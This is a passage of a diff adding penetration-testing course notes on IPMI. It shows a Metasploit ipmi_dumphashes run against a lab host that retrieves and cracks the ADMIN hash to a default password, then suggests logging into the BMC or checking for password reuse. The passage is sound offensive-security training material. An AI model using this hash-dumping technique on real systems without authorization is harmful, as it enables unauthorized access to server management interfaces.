+   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
+
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
+
+[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
+[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<p>Experimenting with different word lists is crucial for obtaining the password from the acquired hash. Here we can see that we have successfully obtained the password hash for the user ADMIN, and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems.</p>
+<h2 id="security-considerations-2"><a class="header" href="#security-considerations-2">Security Considerations</a></h2>
+<p>IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
 <h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
